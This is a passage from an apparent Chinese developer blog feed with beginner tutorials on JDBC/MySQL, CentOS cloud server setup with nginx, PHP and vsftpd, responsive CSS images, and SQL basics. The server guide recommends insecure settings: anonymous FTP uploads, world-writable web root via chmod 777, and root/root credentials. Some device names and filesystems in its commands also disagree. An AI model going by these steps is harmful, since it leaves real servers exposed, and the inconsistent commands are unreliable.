title="然后在项目下面新建java包"></a>然后在项目下面新建java包</h3><p>导入数据库驱动，和mysql的端口：</p><pre><code class="java">    String driverName = &quot;com.mysql.jdbc.Driver&quot;;    //com.mysql.jdbc.Driver就是数据库驱动，    String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;    //localhost:3306是默认的数据库端口，test就是我们的数据库名字了</code></pre><p>这是我们设置mysql的账号密码；    </p><pre><code class="java"> String userName = &quot;root&quot;; String userPwd = &quot;root&quot;;Connection conn = null;try {    //下面两行就是与我们的数据库取得连接的代码            Class.forName(driverName);            conn = DriverManager.getConnection(dbUrl, userName, userPwd);        } </code></pre><p>连接起来就是</p><pre><code class="java">import java.sql.*;public class Menu {    public static void main(String[] args) {         String driverName = &quot;com.mysql.jdbc.Driver&quot;;         String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;         String userName = &quot;root&quot;;         String userPwd = &quot;root&quot;;        try {            Class.forName(driverName);            Connection conn = DriverManager.getConnection(dbUrl, userName, userPwd);        } catch (SQLException e) {            e.printStackTrace();        } catch (ClassNotFoundException e) {            e.printStackTrace();        }    }}</code></pre><p>运行一下</p><p><img src="https://ae01.alicdn.com/kf/H1cb4de8335cd4201984f9e18ceb3617fI.jpg" srcset="undefined" alt=""></p><h3 id="显示“运行成功”就说明数据库连接成功了；"><a href="#显示“运行成功”就说明数据库连接成功了；" class="headerlink" title="显示“运行成功”就说明数据库连接成功了；"></a>显示“运行成功”就说明数据库连接成功了；</h3><h2 id="测试一下插入一条数据"><a href="#测试一下插入一条数据" class="headerlink" title="测试一下插入一条数据"></a>测试一下插入一条数据</h2><pre><code class="java">import java.sql.*;public class Menu {    public static void main(String[] args)throws SQLException {        Connection conn = null;        Statement stat = null;         String driverName = &quot;com.mysql.jdbc.Driver&quot;;         //加载数据库驱动类         String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;//         数据库连接         String userName = &quot;root&quot;;//         账号         String userPwd = &quot;root&quot;;//         密码        try {            Class.forName(driverName);            conn = DriverManager.getConnection(dbUrl, userName, userPwd);            String sql = &quot;insert into login(username,password)values(&#39;张三&#39;,&#39;123456&#39;)&quot;;            stat=conn.createStatement();//            数据库的语句            if(stat.executeUpdate(sql)==1) {//                这行语句可以执行sql语句并返回改变数据的条数，判断影响行数                System.out.println(&quot;成功&quot;);            }else {                System.out.println(&quot;失败&quot;);            }        }  catch (ClassNotFoundException e) {            e.printStackTrace();        }catch (SQLException e) {            e.printStackTrace();        }        if (stat != null)            stat.close();        if (conn != null)            conn.close();    }}</code></pre><h3 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="https://ae01.alicdn.com/kf/H3ae0b705dd0f4431af244b4239cd08dfB.jpg" srcset="undefined" alt=""></p><h3 id="数据库数据增加一条："><a href="#数据库数据增加一条：" class="headerlink" title="数据库数据增加一条："></a>数据库数据增加一条：</h3><p><img src="https://ae01.alicdn.com/kf/H26690235d4f54ceba251643fd620c9adb.jpg" srcset="undefined" alt=""></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新手玩云服务器</title>
    <link href="undefined2019/12/01/%E6%96%B0%E6%89%8B%E7%8E%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>2019/12/01/%E6%96%B0%E6%89%8B%E7%8E%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00"><a href="#0X00" class="headerlink" title="0X00:"></a>0X00:</h2><h3 id="连接到云服务器："><a href="#连接到云服务器：" class="headerlink" title="连接到云服务器："></a>连接到云服务器：</h3><p>我的电脑系统是win7,而且买的是CentOS的,所以这里只说本地windows下怎么配置CentOS云服务器:</p><p>腾讯官方文档给出的是用SecureCRT、putty来登录,个人觉得xshell可以完爆这两货。。。<br><a href="http://rj.baidu.com/soft/detail/15201.html?ald" target="_blank" rel="noopener">xshell下载地址</a></p><p>打开xshell,新建服务器连接,如下图所示:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/建立连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">建立连接1</a></a></p><pre><code>名称随你喜欢,填个有意义又简单的最好~主机填写云主机的公网IP端口号默认为22说明随你喜欢,跟名称的说法一样~</code></pre><pre><code>SUSE/CentOS/Debian：rootWindows：Administratorubuntu：ubuntu </code></pre><p>密码的话,在你购买的订单中是有初始密码的,最好进行密码重置:<br>进入腾讯云中心,进入管理中心,点击云主机的<code>更多</code>进行密码重置:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/重置密码1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%811.png" target="_blank" rel="noopener">重置密码</a></a></p><h4 id="注意！要先将云主机关机才能重置密码"><a href="#注意！要先将云主机关机才能重置密码" class="headerlink" title="注意！要先将云主机关机才能重置密码"></a>注意！要先将云主机关机才能重置密码</h4><p><a href="http://7xqtjy.com1.z0.glb.clouddn.com/进行连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">进行连接1</a></a></p><p>在你下订单后购买到云主机后,可以将云主机私钥导入到你的电脑中,这个是建立连接的关键<br>点击浏览-&gt;文件,选择你的私钥,下面密码填你设置的密码,点击确定,进行连接,看到类似下图,说明连接成功~<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/连接成功1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F1.png" target="_blank" rel="noopener">连接成功</a></a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="进行云服务器的数据盘相关操作"><a href="#进行云服务器的数据盘相关操作" class="headerlink" title="进行云服务器的数据盘相关操作:"></a>进行云服务器的数据盘相关操作:</h3><p>数据盘信息:<br>运行以下命令可以查看数据盘相关信息,包括数据盘大小,被占用的空间以及剩余空间等等</p><pre><code># fdisk -l# df -h </code></pre><p>数据盘分区:<br>官方文档说是按以下命令来进行数据盘分区:</p><pre><code># fdisk /dev/xvdbs</code></pre><p>嗯,我试了下这个命令,结果给我提示这个:<br>Unable to open /dev/xvdb</p><p>查了下,发现新的CentOS系统应该按这样的命令去分区:</p><pre><code># fdisk /dev/vdbs</code></pre><p>执行完这个命令以后,依次执行以下命令:</p><pre><code>n         新建分区p         进行主分区1         使用第一个主分区EnterEnter     这里的两次Enter都是选择默认配置wq        保存并退出</code></pre><p>此时再输入<code>fdisk -l</code>如果看到<code>/dev/vdbs</code>和<code>/dev/vdal</code>,<br>则说明分区成功<br>当然,分区可以创建多个,具体看你喜欢,不过要谨慎!</p><p>格式化新分区:<br>格式化新分区是为了后面能在系统上安装软件以及进行相关必要的操作:</p><pre><code>mke2fs、mkfs.ext2、mkfs.ext3、mkfs.ext4</code></pre><p>Windows下的文件系统有Fat32、NTFS，CentOS使用的文件系统为ext。之前CentOS5版本使用ext3作为默认的文件系统，而CentOS6使用ext4作为默认的文件系统,我的是CentOS6.5的,当然是ext4啦~</p><pre><code>mkfs.ext4 /dev/vdb1</code></pre><p>挂载新分区:<br>依旧给出代码(官方文档给出的):</p><pre><code># mkdir /mydata                    创建mydata目录# mount /dev/xvdb1 /mydata      手动挂载新分区</code></pre><p>再用<code>df -h</code>查看,如果看到<code>Filesystem</code>有<code>/dev/vdb1</code>和<code>/dev/vda1</code>的话就说明挂载新分区成功~</p><p>添加分区信息(就是保存你的挂载):<br>这个操作是为了让主机在重启或关机后开机都能进行自动挂载,免得你每次手动挂载,这里按照官方文档给出的命令就行了~</p><pre><code>echo &#39;/dev/xvdb1 /mydata ext3 defaults 0 0&#39; &gt;&gt; /etc/fstab  添加命令分区信息cat /etc/fstab  查看是否添加成功</code></pre><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="在云服务器进行软件安装"><a href="#在云服务器进行软件安装" class="headerlink" title="在云服务器进行软件安装:"></a>在云服务器进行软件安装:</h3><p>腾讯云服务器提供了yum下载源,即我们可以通过yum在云服务器中下载东西,很简单的命令就可以安装:</p><pre><code># yum install mysql mysql-server nginx php php-fpm</code></pre><p>按<code>y</code>确定后进行安装,出现<code>Complete</code>即安装成功</p><p>安装完软件后,我们可以查看软件相关信息:</p><pre><code># rpm -ql nginx       查看安装目录# rpm -q nginx         查看安装版本</code></pre><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="云服务器环境配置"><a href="#云服务器环境配置" class="headerlink" title="云服务器环境配置:"></a>云服务器环境配置:</h3><p>按照官方文档,我们来配置nginx和php:<br>配置nginx:<br>我们先启动nginx服务先</p><pre><code># service nginx start</code></pre><p>启动完后访问公网IP,如果能访问到,说明nginx服务启动成功</p><p>配置php:<br>同样启动php服务先</p><pre><code># service php-fpm start</code></pre><p>查看php-fpm默认配置</p><pre><code># cat /etc/php-fpm.d/www.conf |grep -i &#39;listen =&#39;</code></pre><p>如果看到<code>listen = 127.0.0.1:9000</code>,说明监听端口为9000,<br>我们要将php解析的请求全部转发到127.0.0.1:9000</p><p>修改nginx配置:</p><pre><code># vim /etc/nginx/conf.d/default.conf</code></pre><p>按官方文档的修改方式来:</p><pre><code>server {      listen       80;      root   /usr/share/nginx/html;      server_name  localhost;  #charset koi8-r;  #access_log  /var/log/nginx/log/host.access.log  main;      location / {          index  index.html index.htm;      }  #error_page  404              /404.html;  # redirect server error pages to the static page /50x.html  #      error_page   500 502 503 504  /50x.html;      location = /50x.html {          root   /usr/share/nginx/html;      }# proxy the PHP scripts to Apache listening on 127.0.0.1:80  ## location ~ \.php$ {  # proxy_pass   http://127.0.0.1;  # }# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000  #      location ~ \.php$ {          fastcgi_pass   127.0.0.1:9000;          fastcgi_index   index.php;          fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;          include        fastcgi_params;      }  # deny access to .htaccess files, if Apache&#39;s document root  # concurs with nginx&#39;s one  #  # location ~ /\.ht {  #    deny  all;  # }}</code></pre><p>修改完后按<code>ESC</code>,然后<code>：wq</code>，保存修改</p><h4 id="注意！要加-不然是无法输的-我早上因为这个弄惨了QAQ"><a href="#注意！要加-不然是无法输的-我早上因为这个弄惨了QAQ" class="headerlink" title="注意！要加:,不然是无法输的,我早上因为这个弄惨了QAQ"></a>注意！要加<code>:</code>,不然是无法输的,我早上因为这个弄惨了QAQ</h4><p>然后重启nginx服务</p><pre><code># service nginx restart</code></pre><p>验证配置:</p><pre><code># vim /usr/share/nginx/html/index.php </code></pre><p>php的内容配置:</p><pre><code>&lt;?php    echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;;    echo &quot;hello world&quot;;?&gt;</code></pre><p>接下来访问公网<code>IP/index.php</code>,看到<code>helloworld</code>就说明环境配置成功了</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="部署代码到云服务器中"><a href="#部署代码到云服务器中" class="headerlink" title="部署代码到云服务器中:"></a>部署代码到云服务器中:</h3><p>一般我们要把代码放到云服务器中,就要通过FTP上传来放,<br>所以我们首先要在云服务器配置FTP服务,在腾讯云上可以直接<br>用yum来装vsftpd配置FTP:</p><pre><code># yum install vsftpd</code></pre><p>然后是配置vsftpd</p><pre><code># vim /etc/vsftpd/vsftpd.conf</code></pre><p>只要将下图的这些选项都搞好就行了,如果你要取消匿名登录使用ftp服务,那么要将<code>vsftpd.conf</code>中的<code>anonymous_enable=YES</code>注释掉或者改为<code>anonymous_enable=NO</code></p><pre><code>local_enable=YESwrite_enable=YESlocal_umask=022anon_upload_enable=YES                //anon的这三个是要你去手动取消注释的,其他的默认都有了anon_mkdir_write_enable=YES            anon_umask=022                        dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YES</code></pre><p>你要如何知道这个配置呢?可以通过以下代码进行读取,经过前面的<br>配置我们也能猜到是要用<code>cat</code>这个命令了:</p><pre><code># cat /etc/vsftpd/vsftpd.conf |grep ^[^#]    </code></pre><p>配置了FTP服务后,我们要建立FTP用户名和密码,这是我们要建立FTP连接上传文件要用到的登录用户名和密码,</p><p>建立用户名:</p><pre><code># useradd -d /home/megiki -s /sbin/nologin megiki       megiki是我ftp的用户名,所以将你的用户名替换掉megiki就行了</code></pre><p>给对应用户设置密码:</p><pre><code># passwd megiki     这里同样替换你的ftp用户名</code></pre><h4 id="注意-这里会要你输入密码-并且重新输入-而你的输入是看不到的-所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了-密码不要输错"><a href="#注意-这里会要你输入密码-并且重新输入-而你的输入是看不到的-所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了-密码不要输错" class="headerlink" title="注意!,这里会要你输入密码,并且重新输入,而你的输入是看不到的,所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了,密码不要输错"></a>注意!,这里会要你输入密码,并且重新输入,而你的输入是看不到的,所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了,密码不要输错</h4><p>接下来就是修改pam文件了,修改这个文件的目的是为了真正让我们设置的ftp用户能连接到ftp服务器:</p><pre><code># vim /etc/pam.d/vsftpd</code></pre><p>这里按官方文档的修改方式:</p><pre><code>auth required /lib64/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed auth required /lib64/security/pam_unix.so shadow nullok auth required /lib64/security/pam_shells.so account required /lib64/security/pam_unix.so session required /lib64/security/pam_unix.so </code></pre><p>修改完后确认:</p><pre><code># cat /etc/pam.d/vsftpd #%PAM-1.0 </code></pre><p>下面这个是你修改后产生的结果:</p><pre><code>auth required /lib64/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed auth required /lib64/security/pam_unix.so shadow nullok auth required /lib64/security/pam_shells.so account required /lib64/security/pam_unix.so session required /lib64/security/pam_unix.so</code></pre><p>事实上,我在配置的时候发现还是和官方文档的说明有很大差别的,这个是我修改之前的样子:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/修改pam1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E4%BF%AE%E6%94%B9pam1.png" target="_blank" rel="noopener">修改之前</a></a></p><p>这是我修改之后的样子:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/修改pam2.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E4%BF%AE%E6%94%B9pam2.png" target="_blank" rel="noopener">修改之后</a></a></p><p>如果你在按我上面所说的方法配置,遇到了pam文件不一样的问题,也可以按我上面这两个图来配置(注意把里面的ftp用户名改为你的)</p><p>这样云服务器的ftp服务算是完成了,我们可以用FTP上传工具去上传我们的<br>代码了,这里我们用官网说的FileZilla进行FTP上传,我们先建立一个新站点,以后直接连接这个站点就行了~<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/新建ftp连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E6%96%B0%E5%BB%BAftp%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">新建站点</a></a></p><pre><code>主机:你的公网IP端口:用21端口登录类型:一般用户名:填写你设置的FTP用户密码:同上</code></pre><p>然后我们在<code>/usr/share/nginx/html</code>这个目录下进行代码文件的传输,<br>这样就把我们的代码部署到云服务器上了,比如你把<code>text.html</code>传到这个目录下,然后我们访问<code>你的公网IP/text.html</code>,内容就是你上传的<code>text.html</code></p><p><a href="http://7xqtjy.com1.z0.glb.clouddn.com/FTP上传目录1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/FTP%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%951.png" target="_blank" rel="noopener">上传目录</a></a></p><p>这个说一个问题啊,可能我们按上面的步骤进行FTP传输时可能一个都传输不了,这时你可以查看<code>/usr/share/nginx/html</code>这个文件的文件权限,如果是755,说明公共组是不能进行FTP上传的,这时候,我们可以在xshell5上进行权限的修改:</p><pre><code># chmod -R 777 /usr/share/nginx/html</code></pre><p>将权限改为777,然后公共组就拥有了写入的功能,这时可以FTP传输了</p><p>当然,如果你觉得这样不安全(事实上是确实有些不安全的),你可以用git的方式(简单又粗暴),用<code>git clone</code>的方式进行传输,你可以把你上传的代码放在你的<code>github</code>或者<code>coding</code>的私有库上,再传输给你的服务器,具体怎么做这里就不说了(如果你熟悉git操作的话你应该懂的,不懂git为何物的话请戳<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">这里</a>)</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>好了,关于云服务器的配置就说到这里(好像写得有些太长了，其实我个人也不喜欢太长的博客,太长的博客我基本都没有认真看完的QAQ),这个只是新手级别的配置,云服务器是可以让你玩年系列的东西,特别是你在实际项目中的运用,有时间我会继续研究云服务器这个东西的(顺带研究nginx这个东西)</p><p>玩这个东西花了我一早上的时间,早上的汇编和汇编实验课我都在干我自己的<br>(这里说一句,真的,大学那些计算机的课真是纯理论课,没有什么实际意义,老师讲的又慢,硬是能把20分钟的东西用两节课来讲。。。),这段时间我报名了’校园杯’,截止日期是4月23日,也没什么时间给我浪了,所以关于云服务器的探索就到这里,等我搞完这个比赛后再折腾这些(话说校园杯过了后还有CTF,挑战杯QAQ)。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图片自适应的五种可能</title>
    <link href="undefined2019/11/30/%E5%9B%BE%E7%89%87%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%83%BD/"/>
    <url>2019/11/30/%E5%9B%BE%E7%89%87%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<ol><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#transform实现居中" target="_blank" rel="noopener">transform实现居中</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#background" target="_blank" rel="noopener">background</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#object-fit" target="_blank" rel="noopener">object-fit</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#height使用vw单位" target="_blank" rel="noopener">height使用vw单位</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#活用padding" target="_blank" rel="noopener">活用padding</a></li></ol><p>在自适应问题上，图片的自适应可以说是最关键了。</p><p>在仿做小红书的过程中，我也遇到了这个问题，小红书作为一个商品展示性的社区，商品图片的自适应是很重要的。在放眼望去都是图片的页面里，一两个变形可能会极大地影响用户的感受。</p><p>我在两个地方遇到了图片适应的问题，一个是品牌精选的卡片，对于宽固定，图片高度不规则并且比容器本身要大的情况；还有一个是在做九宫格要求图片宽高一致。</p><h2 id="transform实现居中"><a href="#transform实现居中" class="headerlink" title="transform实现居中"></a>transform实现居中</h2><p>这是小红书官方采用的方案，设置外层<code>overflow:hidden</code>，然后将内部图片设置居中，多余的部分直接被隐藏。这种方案对于不能明确容器和待展示图片大小关系的情况时并不使用。</p><h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><p>主要应用到的是一个<code>background-size:cover</code>属性，这个属性可以使图片适应填满，多余的部分会被裁剪掉。</p><pre><code>background-image:url();background-size: cover;background-posiiton:center;</code></pre><p>这种方案是目前使用范围最广泛，并且认为最理想的解决方案，但是张鑫旭的博客中对于这种方案提了一点问题：由于cover存在剪裁，所以在大小发生变化时展示出来的背景图区域也是不同的。这主要是因为视窗宽度变化时，高度没有等比例变化。对此他提出了本文最后的两种解决方案。</p><hr><p>一点延伸，在复习background属性时碰到了一个知识点。</p><p>background-clip和background-origin的可选值都是一样的，border-box、padding-box、content-box。那么他们的区别是什么？</p><p>简单来说，clip是规定了定位的区域，而origin只是定义了原点，也就是左上角。</p><p>另外对于border-box，如果填充的是图片，左边和上边实际上并不会填充进去。</p><h2 id="object-fit"><a href="#object-fit" class="headerlink" title="object-fit"></a>object-fit</h2><p><code>object-fit</code>基本上算是<code>background-size</code>的姐妹篇，不同的是，这个属性是对于置换元素而言而非背景图像。</p><h2 id="height使用vw单位"><a href="#height使用vw单位" class="headerlink" title="height使用vw单位"></a>height使用vw单位</h2><p>一言以蔽之：这主要是因为视窗宽度变化时，高度没有等比例变化。</p><h2 id="活用padding"><a href="#活用padding" class="headerlink" title="活用padding"></a>活用padding</h2><p>padding使用百分比单位时，是根据父级元素的宽度来确定的，所以通过设定padding，可以实现自适应，他们的宽高是同时变化的。</p><p>接下来是偷css大招。</p><pre><code>.banner {    padding: 15.15% 0 0;    position: relative;}.banner &gt; img {    position: absolute;    width: 100%; height: 100%;    left: 0; top: 0;}</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java根据正则过滤特殊字符</title>
    <link href="undefined2019/11/26/java%E6%A0%B9%E6%8D%AE%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/"/>
    <url>2019/11/26/java%E6%A0%B9%E6%8D%AE%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<pre><code class="java">public class FilterSpecialStr {    public static void main(String[] args) {        String regEx=&quot;[\n`~!@#$%^&amp;*()+=|{}&#39;:;&#39;,\\[\\].&lt;&gt;/?~！@#￥%……&amp;*（）——+|{}【】‘；：”“’。， 、？]&quot;;           // 除了字母数字下划线之外的字符为非法字符        Pattern pattern = Pattern.compile(regEx);        // 指定设置非法字符        // Pattern pattern = Pattern.compile(&quot;[@#]&quot;);        String str = &quot;123@abc {}  \n  #D     EF。&quot;;        Matcher matcher = pattern.matcher(str);        StringBuffer buffer = new StringBuffer();        //如果找到非法字符        while (matcher.find()) {        // 如果里面包含非法字符如冒号双引号等，那么就把他们消去，并把非法字符前面的字符放到缓冲区            matcher.appendReplacement(buffer, &quot;&quot;);        }        // 将剩余的合法部分添加到缓冲区        matcher.appendTail(buffer);        System.out.println(&quot;过滤前的字符: &quot; + str);        System.out.println(&quot;过滤后的字符: &quot; + buffer.toString());    }}</code></pre><p>输出的结果：</p><p> 过滤前的字符: 123@abc {}<br>  #D   EF。<br> 过滤后的字符: 123abcDEF</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库增删改查SQL语句</title>
    <link href="undefined2019/11/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5SQL%E8%AF%AD%E5%8F%A5/"/>
    <url>2019/11/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5SQL%E8%AF%AD%E5%8F%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="MySQL数据库增删改查SQL语句"><a href="#MySQL数据库增删改查SQL语句" class="headerlink" title="MySQL数据库增删改查SQL语句"></a>MySQL数据库增删改查SQL语句</h3><p><img src="C:%5CUsers%5CCZ%5CDesktop%5Ctimg.jpg" srcset="undefined" alt=""></p><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><pre><code class="mysql">show databases; </code></pre><h5 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h5><pre><code class="mysql">use 数据库名;</code></pre><h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><pre><code class="mysql">CREATE DATABASE 数据库名;</code></pre><h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><pre><code class="mysql">DROP DATABASE 数据库名;</code></pre><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><pre><code class="mysql">create table 表名(    列名1 类型(长度) [约束],    列名2 类型(长度) [约束],    ……);</code></pre><h5 id="长度区别"><a href="#长度区别" class="headerlink" title="长度区别"></a>长度区别</h5><p>int类型带长度：不影响存取值，即使设定的值超出了长度的范畴，也能存，如果没有达到设定的长度，则使用空格自动填充到设定的长度<br>char类型：不可变字符，设定的长度就是规定当前字段能存的数据的最大长度，若超出长度，则会报错，若没有达到长度，使用空格填充到设定的长度<br>varchar：可变字符，设定的长度同样是规定当前字段能存的数据的最大长度，若超出长度，则会报错，若没有达到长度，不会使用空格填充，实际多长就是多长</p><h5 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h5><pre><code class="mysql">DROP TABLE 表名;</code></pre><h5 id="表约束"><a href="#表约束" class="headerlink" title="表约束"></a>表约束</h5><p>1.非空约束    NOT NULL</p><p>2.默认值约束  DEFAULT ‘男’</p><p>3.唯一约束    UNIQUE4.主键约束    PRIMARY KEY</p><h5 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h5><p>DESC 表名</p><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><h5 id="修改列名"><a href="#修改列名" class="headerlink" title="修改列名"></a>修改列名</h5><pre><code class="mysql">Alter table 表名  change  列名  新列名 类型;</code></pre><h5 id="修改列类型"><a href="#修改列类型" class="headerlink" title="修改列类型"></a>修改列类型</h5><pre><code class="mysql">Alter table 表名  change 列名  列名  新类型;</code></pre><h5 id="修改列类型-1"><a href="#修改列类型-1" class="headerlink" title="修改列类型"></a>修改列类型</h5><pre><code class="mysql">Alter table 表名  modify  列名  新类型;</code></pre><h5 id="数据查询-单表"><a href="#数据查询-单表" class="headerlink" title="==============================数据查询-单表================================="></a>==============================数据查询-单表=================================</h5><h5 id="查询表中全部信息"><a href="#查询表中全部信息" class="headerlink" title="查询表中全部信息"></a>查询表中全部信息</h5><pre><code class="mysql">select * from 表名;</code></pre><h5 id="查询表中指定列的信息"><a href="#查询表中指定列的信息" class="headerlink" title="查询表中指定列的信息"></a>查询表中指定列的信息</h5><pre><code class="mysql">select 列1,列2 from 表名;</code></pre><p>语句的执行顺序：from—&gt;select</p><h5 id="数据去重"><a href="#数据去重" class="headerlink" title="数据去重"></a>数据去重</h5><pre><code class="mysql">select distinct 列…. From 表名;</code></pre><h5 id="拼接结果"><a href="#拼接结果" class="headerlink" title="拼接结果"></a>拼接结果</h5><pre><code class="mysql">select concat(列1,列2) from 表名;</code></pre><h5 id="运算符优先级："><a href="#运算符优先级：" class="headerlink" title="运算符优先级："></a>运算符优先级：</h5><p>1.乘法和除法的优先级高于加法和减法<br>2.同级运算的顺序是从左到右<br>3.表达式中使用”括号”可强行改变优先级的运算顺序</p><pre><code class="mysql">select 列1[+-*/]列2 from 表名;</code></pre><h5 id="设置别名-注意：关键字as可以省略"><a href="#设置别名-注意：关键字as可以省略" class="headerlink" title="设置别名(注意：关键字as可以省略)"></a>设置别名(注意：关键字as可以省略)</h5><pre><code class="mysql">select 列 as 别名 from 表名;  select 列 别名 from 表名;     </code></pre><p> 语句的执行顺序：from—&gt;select</p><h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><pre><code class="mysql">select 列… from 表名 where 条件;  </code></pre><h5 id="条件中比较运算符：-等于-大于-gt-大于等于-gt-小于-lt-小于等于-lt-不等于-或-lt-gt"><a href="#条件中比较运算符：-等于-大于-gt-大于等于-gt-小于-lt-小于等于-lt-不等于-或-lt-gt" class="headerlink" title="条件中比较运算符：( 等于:=  大于:&gt;  大于等于:&gt;=  小于:&lt;  小于等于:&lt;=  不等于:!= 或 &lt;&gt;  )"></a>条件中比较运算符：( 等于:=  大于:&gt;  大于等于:&gt;=  小于:&lt;  小于等于:&lt;=  不等于:!= 或 &lt;&gt;  )</h5><pre><code class="mysql">where 列  比较运算符  值;</code></pre><p>注意:字符串、日期需使用单引号括起来<br>语句的执行顺序：from—&gt;where—&gt;select</p><h5 id="逻辑运算符-并且-and-或-amp-amp-或-or-非-not-或"><a href="#逻辑运算符-并且-and-或-amp-amp-或-or-非-not-或" class="headerlink" title="逻辑运算符( 并且:and 或 &amp;&amp;   或:or    非:not 或 !    )"></a>逻辑运算符( 并且:and 或 &amp;&amp;   或:or    非:not 或 !    )</h5><pre><code class="mysql">where 条件1  逻辑运算符  条件2;  where not 条件; </code></pre><h5 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h5><pre><code class="mysql">where 列 between 条件1  and 条件2;        </code></pre><p>//列在这个区间的值where 列 not between 条件1 and 条件2;    </p><p>//不在这个区间where !( 列 between 条件1 and 条件2 );    </p><p>//同样表示不在这个区间</p><h5 id="集合查询-判断列的值是否在指定的集合中"><a href="#集合查询-判断列的值是否在指定的集合中" class="headerlink" title="集合查询( 判断列的值是否在指定的集合中 )"></a>集合查询( 判断列的值是否在指定的集合中 )</h5><pre><code class="mysql">where 列 in(值1,值2);      </code></pre><p>//列中的数据是in后的值里面的where 列 